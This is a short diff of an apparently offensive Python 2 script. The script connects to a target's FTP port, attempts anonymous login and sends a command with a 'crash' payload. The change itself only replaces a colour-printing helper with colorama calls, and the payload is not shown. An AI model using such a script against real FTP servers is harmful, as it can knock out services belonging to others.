@@ -28,7 +28,7 @@ import sys
 import time
 import struct
 from docopt import docopt
-from utilities import escape_color
+from colorama import Fore, init
 
 
 def main(arguments):
@@ -73,7 +73,7 @@ def main(arguments):
     try:
         s.connect((target, 21))
     except:
-        print escape_color("[-] Connection to " + target + " failed!", "red")
+        print Fore.RED + "[-] Connection to " + target + " failed!" + Fore.RESET
         sys.exit(0)
 
     print "[+] Attempting anonymous login"
@@ -86,8 +86,9 @@ def main(arguments):
     s.send(command + " " + crash + "\r\n")
     time.sleep(4)
 
-    print escape_color("[*] Command sent!", "green")
+    print Fore.GREEN + "[*] Command sent!" + Fore.RESET
 
 if __name__ == '__main__':
+    init()
     arguments = docopt(__doc__, version=0.1)
     main(arguments)
